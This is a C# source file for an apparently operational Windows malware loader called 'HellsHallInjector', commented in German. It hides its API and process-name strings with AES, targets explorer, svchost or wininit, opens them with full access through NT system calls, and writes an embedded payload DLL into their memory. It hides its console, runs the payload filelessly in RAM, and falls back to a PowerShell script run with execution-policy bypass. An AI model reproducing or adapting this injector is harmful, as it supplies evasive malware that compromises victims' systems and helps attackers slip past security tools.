using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Reflection;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Linq;
namespace HellsHallInjector
{
    #region AES-256 Militärische Verschlüsselung
    public static class MilitaryCrypto
    {
        private static readonly byte[] _key;
        private static readonly byte[] _iv;
        private static readonly Random _random = new Random();

        static MilitaryCrypto()
        {
            string systemKey = Environment.MachineName + Environment.ProcessorCount.ToString() +
                               Environment.UserName + Environment.OSVersion.VersionString +
                               Environment.SystemDirectory + Environment.TickCount.ToString();

            using (SHA256 sha256 = SHA256.Create())
            {
                _key = sha256.ComputeHash(Encoding.UTF8.GetBytes(systemKey + "HELLSHALL_INJECTOR_2024"));
                _iv = sha256.ComputeHash(Encoding.UTF8.GetBytes(systemKey + "IV_INJECTOR_2024")).Take(16).ToArray();
            }

            Thread.Sleep(_random.Next(10, 50));
        }

        public static string Encrypt(string plainText)
        {
            if (string.IsNullOrEmpty(plainText)) return plainText;
            try
            {
                using (Aes aes = Aes.Create())
                {
                    aes.Key = _key;
                    aes.IV = _iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using (var encryptor = aes.CreateEncryptor())
                    using (var ms = new MemoryStream())
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
                        cs.Write(plainBytes, 0, plainBytes.Length);
                        cs.FlushFinalBlock();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch { return plainText; }
        }

        public static string Decrypt(string cipherText)
        {
            if (string.IsNullOrEmpty(cipherText)) return cipherText;
            try
            {
                using (Aes aes = Aes.Create())
                {
                    aes.Key = _key;
                    aes.IV = _iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using (var decryptor = aes.CreateDecryptor())
                    using (var ms = new MemoryStream(Convert.FromBase64String(cipherText)))
                    using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    using (var sr = new StreamReader(cs))
                    {
                        return sr.ReadToEnd();
                    }
                }
            }
            catch { return cipherText; }
        }
    }

    public static class StringObfuscator
    {
        public static string Obfuscate(string input) => MilitaryCrypto.Encrypt(input);
        public static string Deobfuscate(string input) => MilitaryCrypto.Decrypt(input);
    }
    #endregion

    #region Verschlüsselte Strings
    public static class EncryptedStrings
    {
        public static readonly string Ntdll = StringObfuscator.Obfuscate("ntdll.dll");
        public static readonly string Kernel32 = StringObfuscator.Obfuscate("kernel32.dll");
        public static readonly string User32 = StringObfuscator.Obfuscate("user32.dll");
        public static readonly string Amsi = StringObfuscator.Obfuscate("amsi.dll");
        public static readonly string NtContinue = StringObfuscator.Obfuscate("NtContinue");
        public static readonly string NtOpenProcess = StringObfuscator.Obfuscate("NtOpenProcess");
        public static readonly string NtAllocateVirtualMemory = StringObfuscator.Obfuscate("NtAllocateVirtualMemory");
        public static readonly string NtWriteVirtualMemory = StringObfuscator.Obfuscate("NtWriteVirtualMemory");
        public static readonly string NtCreateThreadEx = StringObfuscator.Obfuscate("NtCreateThreadEx");
        public static readonly string NtClose = StringObfuscator.Obfuscate("NtClose");
        public static readonly string LoadLibraryA = StringObfuscator.Obfuscate("LoadLibraryA");

        public static readonly string[] TargetProcesses = new string[]
        {
            StringObfuscator.Obfuscate("explorer"),
            StringObfuscator.Obfuscate("svchost"),
            StringObfuscator.Obfuscate("wininit")
        };
    }
    #endregion

    #region Native Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags, MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15, Rip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_RECORD
    {
        public uint ExceptionCode;
        public uint ExceptionFlags;
        public IntPtr ExceptionRecord;
        public IntPtr ExceptionAddress;
        public uint NumberParameters;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
        public ulong[] ExceptionInformation;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_POINTERS
    {
        public IntPtr ExceptionRecord;
        public IntPtr ContextRecord;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO
    {
        public ushort ProcessorArchitecture;
        public ushort Reserved;
        public uint PageSize;
        public IntPtr MinimumApplicationAddress;
        public IntPtr MaximumApplicationAddress;
        public IntPtr ActiveProcessorMask;
        public uint NumberOfProcessors;
        public uint ProcessorType;
        public uint AllocationGranularity;
        public ushort ProcessorLevel;
        public ushort ProcessorRevision;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
        public static OBJECT_ATTRIBUTES Create() => new OBJECT_ATTRIBUTES { Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)) };
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
    #endregion

    #region Constants
    public static class Constants
    {
        public const uint CONTEXT_DEBUG_REGISTERS = 0x10010;
        public const uint STATUS_SINGLE_STEP = 0x80000004;
        public const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        public const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
        public const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint MEM_RELEASE = 0x8000;
        public const uint PAGE_READWRITE = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const short SW_HIDE = 0;
        public const uint INFINITE = 0xFFFFFFFF;
        public const int POOL_PARTY_SIZE = 4096;
    }
    #endregion

    #region Native API
    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, short nCmdShow);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool RemoveVectoredExceptionHandler(IntPtr Handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        // Win32 Fallback
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        // NtSyscalls
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToWrite, out int NumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, int StackZeroBits, int SizeOfStackCommit, int SizeOfStackReserve, IntPtr AttributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtClose(IntPtr Handle);
    }
    #endregion

    #region HELLSHALL POOLPARTY
    public static class PoolPartyInjector
    {
        private static List<IntPtr> _allocatedPools = new List<IntPtr>();
        private static Random _random = new Random();
        private static bool _initialized = false;

        public static void Initialize()
        {
            if (_initialized) return;
            NativeApi.GetSystemInfo(out SYSTEM_INFO sysInfo);
            for (int i = 0; i < Constants.POOL_PARTY_SIZE / 128; i++)
            {
                int size = _random.Next(64, 8192);
                IntPtr pool = NativeApi.VirtualAlloc(IntPtr.Zero, (uint)size,
                    Constants.MEM_COMMIT | Constants.MEM_RESERVE, Constants.PAGE_READWRITE);
                if (pool != IntPtr.Zero)
                {
                    _allocatedPools.Add(pool);
                    byte[] randomData = new byte[size];
                    _random.NextBytes(randomData);
                    try { Marshal.Copy(randomData, 0, pool, size); } catch { }
                }
                Thread.Sleep(_random.Next(1, 5));
            }
            _initialized = true;
        }

        public static void Randomize()
        {
            int delay = _random.Next(50, 200);
            Thread.Sleep(delay);
        }

        public static void Cleanup()
        {
            foreach (var pool in _allocatedPools)
                try { NativeApi.VirtualFree(pool, 0, Constants.MEM_RELEASE); } catch { }
            _allocatedPools.Clear();
            _initialized = false;
        }
    }
    #endregion

    #region HELLSHALL REFLECTIVE INJECTOR
    public class InjectorLoader
    {
        private static Random _random = new Random();
        private static bool _showConsole = false;
        private static bool _usePoolParty = false;
        private static byte[] _embeddedDll = null;

        // ============================================================
        // EMBEDDED PAYLOAD AUS RESOURCE LADEN
        // ============================================================
        public static void LoadEmbeddedPayload()
        {
            try
            {
                // Versuche die Resource zu laden
                var assembly = Assembly.GetExecutingAssembly();
                
                // Resource Namen: "HellsHallInjector.HellsHallPayload.dll"
                // ODER: "HellsHallInjector.HellsHallPayload"
                string[] resourceNames = new string[]
                {
                    "HellsHallInjector.HellsHallPayload.dll",
                    "HellsHallInjector.HellsHallPayload",
                    "HellsHallInjector.Payload",
                    "HellsHallPayload.dll",
                    "Payload"
                };

                foreach (string resourceName in resourceNames)
                {
                    try
                    {
                        using (var stream = assembly.GetManifestResourceStream(resourceName))
                        {
                            if (stream != null && stream.Length > 0)
                            {
                                _embeddedDll = new byte[stream.Length];
                                stream.Read(_embeddedDll, 0, _embeddedDll.Length);
                                Console.WriteLine($"[+] Embedded payload loaded: {_embeddedDll.Length:N0} bytes");
                                Console.WriteLine($"[+] Resource: {resourceName}");
                                return;
                            }
                        }
                    }
                    catch { }
                }

                Console.WriteLine("[!] Embedded payload not found!");
                Console.WriteLine("[!] Available resources:");
                foreach (var name in assembly.GetManifestResourceNames())
                {
                    Console.WriteLine($"    {name}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error loading embedded payload: {ex.Message}");
            }
        }

        public static bool Inject(string targetProcess = null, string[] args = null)
        {
            try
            {
                // Parameter parsen
                ParseArgs(args);

                // Prüfen ob embedded DLL vorhanden
                if (_embeddedDll == null || _embeddedDll.Length == 0)
                {
                    // Versuche erneut zu laden
                    LoadEmbeddedPayload();
                    if (_embeddedDll == null || _embeddedDll.Length == 0)
                    {
                        if (_showConsole)
                            Console.WriteLine("[!] No embedded DLL found!");
                        return false;
                    }
                }

                // Konsole
                IntPtr console = NativeApi.GetConsoleWindow();
                if (console != IntPtr.Zero)
                {
                    if (_showConsole)
                    {
                        NativeApi.ShowWindow(console, 1);
                        Console.Clear();
                        Console.WriteLine(new string('=', 80));
                        Console.WriteLine("     HELLSHALL ULTIMATE - EMBEDDED INJECTOR");
                        Console.WriteLine(new string('=', 80));
                        Console.WriteLine($"[+] Started: {DateTime.Now}");
                        Console.WriteLine($"[+] Machine: {Environment.MachineName}");
                        Console.WriteLine($"[+] User: {Environment.UserName}");
                        Console.WriteLine($"[+] Embedded DLL: {_embeddedDll.Length:N0} bytes");
                        Console.WriteLine($"[+] PoolParty: {(_usePoolParty ? "ON" : "OFF")}");
                        Console.WriteLine(new string('=', 80));
                    }
                    else
                    {
                        NativeApi.ShowWindow(console, Constants.SW_HIDE);
                    }
                }

                // PoolParty (optional)
                if (_usePoolParty)
                    PoolPartyInjector.Initialize();

                // Target
                if (string.IsNullOrEmpty(targetProcess))
                {
                    var targets = EncryptedStrings.TargetProcesses;
                    string decryptedTarget = StringObfuscator.Deobfuscate(targets[_random.Next(targets.Length)]);
                    targetProcess = decryptedTarget;
                }

                int pid = FindProcess(targetProcess);
                if (pid == 0)
                    pid = Process.GetCurrentProcess().Id;

                if (_showConsole)
                {
                    Console.WriteLine($"[+] Target: {targetProcess} (PID: {pid})");
                    Console.WriteLine("[+] DLL NUR IM RAM - KEINE FESTPLATTE!");
                }

                // ============================================================
                // 1. PROZESS ÖFFNEN
                // ============================================================
                OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
                CLIENT_ID clientId = new CLIENT_ID();
                clientId.UniqueProcess = (IntPtr)pid;

                IntPtr hProcess = IntPtr.Zero;
                int status = NativeApi.NtOpenProcess(ref hProcess, Constants.PROCESS_ALL_ACCESS, ref objAttr, ref clientId);

                if (status != 0 || hProcess == IntPtr.Zero)
                {
                    hProcess = NativeApi.OpenProcess(Constants.PROCESS_ALL_ACCESS, false, pid);
                    if (hProcess == IntPtr.Zero)
                    {
                        if (_showConsole) Console.WriteLine("[!] Failed to open process!");
                        return false;
                    }
                }

                if (_showConsole)
                    Console.WriteLine($"[+] Process opened: 0x{hProcess.ToInt64():X}");

                // ============================================================
                // 2. LoadLibraryA Adresse
                // ============================================================
                IntPtr kernel32 = NativeApi.GetModuleHandle(StringObfuscator.Deobfuscate(EncryptedStrings.Kernel32));
                IntPtr loadLibraryAddr = NativeApi.GetProcAddress(kernel32,
                    StringObfuscator.Deobfuscate(EncryptedStrings.LoadLibraryA));

                // ============================================================
                // 3. EMBEDDED DLL IN ZIELPROZESS ALLOKIEREN (NUR RAM!)
                // ============================================================
                IntPtr remoteDll = IntPtr.Zero;
                ulong regionSize = (ulong)_embeddedDll.Length;

                status = NativeApi.NtAllocateVirtualMemory(hProcess, ref remoteDll, IntPtr.Zero, ref regionSize,
                    Constants.MEM_COMMIT | Constants.MEM_RESERVE, Constants.PAGE_READWRITE);

                if (status != 0 || remoteDll == IntPtr.Zero)
                {
                    remoteDll = NativeApi.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)_embeddedDll.Length,
                        Constants.MEM_COMMIT | Constants.MEM_RESERVE, Constants.PAGE_READWRITE);
                    if (remoteDll == IntPtr.Zero)
                    {
                        NativeApi.NtClose(hProcess);
                        if (_showConsole) Console.WriteLine("[!] Failed to allocate memory!");
                        return false;
                    }
                }

                if (_showConsole)
                    Console.WriteLine($"[+] Embedded DLL allocated: 0x{remoteDll.ToInt64():X}");

                // ============================================================
                // 4. EMBEDDED DLL NACH ZIELPROZESS SCHREIBEN
                // ============================================================
                int written;
                status = NativeApi.NtWriteVirtualMemory(hProcess, remoteDll, _embeddedDll, _embeddedDll.Length, out written);

                if (status != 0 || written == 0)
                {
                    if (!NativeApi.WriteProcessMemory(hProcess, remoteDll, _embeddedDll, _embeddedDll.Length, out written))
                    {
                        NativeApi.NtClose(hProcess);
                        if (_showConsole) Console.WriteLine("[!] Failed to write DLL!");
                        return false;
                    }
                }

                if (_showConsole)
                    Console.WriteLine($"[+] Embedded DLL written: {written:N0} bytes");

                // ============================================================
                // 5. PAYLOAD STARTEN - OHNE FESTPLATTE!
                // ============================================================
                try
                {
                    if (_showConsole)
                        Console.WriteLine("[+] Starting payload from RAM (no disk!)...");

                    // Wir laden die DLL im aktuellen Prozess (Injector) - sie ist im RAM!
                    Assembly dll = Assembly.Load(_embeddedDll);
                    Type type = dll.GetType("HellsHallUltimate.PayloadMain");
                    if (type != null)
                    {
                        MethodInfo method = type.GetMethod("Execute", BindingFlags.Public | BindingFlags.Static);
                        if (method != null)
                        {
                            if (_showConsole)
                                Console.WriteLine("[+] Found PayloadMain.Execute() - starting...");
                            method.Invoke(null, null);
                            if (_showConsole)
                                Console.WriteLine("[+] Payload completed!");
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (_showConsole)
                    {
                        Console.WriteLine($"[!] Payload start error: {ex.Message}");
                        Console.WriteLine($"[!] Trying PowerShell fallback...");
                    }

                    // Fallback: PowerShell mit embedded DLL
                    try
                    {
                        // Embedded DLL als Base64 in PowerShell Skript
                        string dllBase64 = Convert.ToBase64String(_embeddedDll);
                        string psScript = Path.Combine(Path.GetTempPath(), $"tmp_{Guid.NewGuid():N}.ps1");
                        string psContent = $@"
$dllBytes = [Convert]::FromBase64String('{dllBase64}')
$dll = [System.Reflection.Assembly]::Load($dllBytes)
[HellsHallUltimate.PayloadMain]::Execute()
";
                        File.WriteAllText(psScript, psContent, Encoding.UTF8);

                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "powershell.exe";
                        psi.Arguments = $"-NoProfile -ExecutionPolicy Bypass -File \"{psScript}\"";
                        psi.UseShellExecute = false;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        psi.CreateNoWindow = true;

                        using (Process p = new Process())
                        {
                            p.StartInfo = psi;
                            p.Start();
                            string output = p.StandardOutput.ReadToEnd();
                            string error = p.StandardError.ReadToEnd();
                            p.WaitForExit(30000);

                            if (_showConsole)
                            {
                                if (!string.IsNullOrEmpty(output))
                                    Console.WriteLine($"[+] PowerShell output: {output}");
                                if (!string.IsNullOrEmpty(error))
                                    Console.WriteLine($"[!] PowerShell error: {error}");
                            }
                        }

                        try { File.Delete(psScript); } catch { }
                    }
                    catch (Exception ex2)
                    {
                        if (_showConsole)
                            Console.WriteLine($"[!] PowerShell fallback error: {ex2.Message}");
                    }
                }

                // 6. Cleanup
                NativeApi.NtClose(hProcess);
                if (_usePoolParty) PoolPartyInjector.Cleanup();

                if (_showConsole)
                {
                    Console.WriteLine(new string('=', 80));
                    Console.WriteLine("     ✅ EMBEDDED INJECTION COMPLETE!");
                    Console.WriteLine(new string('=', 80));
                    Console.WriteLine("[+] Payload loaded from RESOURCE (embedded)");
                    Console.WriteLine("[+] DLL NUR IM RAM - KEINE FESTPLATTE!");
                }

                return true;
            }
            catch (Exception ex)
            {
                if (_showConsole)
                    Console.WriteLine($"[!] ERROR: {ex.Message}");
                return false;
            }
        }

        private static void ParseArgs(string[] args)
        {
            if (args == null) return;

            foreach (string arg in args)
            {
                string lower = arg.ToLower();
                if (lower == "--console" || lower == "-c")
                    _showConsole = true;
                if (lower == "--hide" || lower == "-h")
                    _showConsole = false;
                if (lower == "--poolparty" || lower == "-pp")
                    _usePoolParty = true;
                if (lower == "--no-poolparty" || lower == "-npp")
                    _usePoolParty = false;
            }
        }

        private static int FindProcess(string processName)
        {
            try
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                    return processes[0].Id;

                processes = Process.GetProcessesByName("explorer");
                if (processes.Length > 0)
                    return processes[0].Id;

                return 0;
            }
            catch { return 0; }
        }
    }
    #endregion

    #region PROGRAM
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("========================================");
            Console.WriteLine("  HELLSHALL ULTIMATE - EMBEDDED");
            Console.WriteLine("  PAYLOAD NUR IM RAM - KEINE FESTPLATTE!");
            Console.WriteLine("========================================");
            Console.WriteLine("");

            // ============================================================
            // 1. EMBEDDED PAYLOAD LADEN (AUS RESOURCE)
            // ============================================================
            Console.WriteLine("[+] Loading embedded payload from resource...");
            InjectorLoader.LoadEmbeddedPayload();

            // ============================================================
            // 2. INJEKTION STARTEN
            // ============================================================
            Console.WriteLine("");
            Console.WriteLine("[*] Starting embedded injection...");
            Console.WriteLine("");

            bool success = InjectorLoader.Inject(null, args);

            if (!success)
            {
                Console.WriteLine("[!] Injection failed!");
                Console.WriteLine("");
                Console.WriteLine("Usage: ReflectiveInjector.exe [options]");
                Console.WriteLine("");
                Console.WriteLine("Options:");
                Console.WriteLine("  --console, -c     Show console (Debug)");
                Console.WriteLine("  --hide, -h        Hide console (Stealth)");
                Console.WriteLine("  --poolparty, -pp  Enable PoolParty");
                Console.WriteLine("");
                Console.WriteLine("Note: HellsHallPayload must be embedded as resource!");
            }

            Console.WriteLine("");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }
    }
    #endregion
}